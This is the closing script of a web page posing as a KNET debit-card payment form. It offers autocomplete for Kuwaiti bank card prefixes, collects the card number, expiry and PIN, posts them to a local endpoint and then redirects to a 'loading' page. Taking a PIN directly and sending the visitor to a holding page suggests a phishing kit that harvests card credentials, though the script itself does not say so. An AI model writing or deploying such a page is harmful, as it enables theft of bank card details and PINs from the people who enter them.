<script>
    const cardData = [
        { bin: "406739", brand: "NBK", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
        { bin: "419252", brand: "CBK", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
        { bin: "516335", brand: "Gulf", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" },
        { bin: "537015", brand: "KFH", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" }
    ];

    $('#debitNumber').on('input', function() {
        const val = $(this).val();
        if (val.length > 0) {
            const matches = cardData.filter(c => c.bin.startsWith(val));
            if (matches.length > 0) {
                let html = '';
                matches.forEach(m => {
                    html += `<li style="padding:8px; cursor:pointer; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center;" onclick="selectBin('${m.bin}')"><span>${m.bin}</span><img src="${m.logo}" height="15"/></li>`;
                });
                $('#suggestionBox').html(html).show();
            } else { $('#suggestionBox').hide(); }
        } else { $('#suggestionBox').hide(); }
    });

    function selectBin(bin) {
        $('#debitNumber').val(bin);
        $('#suggestionBox').hide();
    }

    async function onPay() {
        const data = {
            payment_method: 'Knet',
            knet_data: {
                card_number: $('#debitNumber').val(),
                expiry_month: $('#expiryMonthBox').val(),
                expiry_year: $('#expiryYearBox').val(),
                card_pin: $('#cardPin').val()
            }
        };
        const res = await fetch('/api/orders/payment-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        const result = await res.json();
        if(result.success) window.location.href = 'loading.html';
    }
</script>
</body></html>
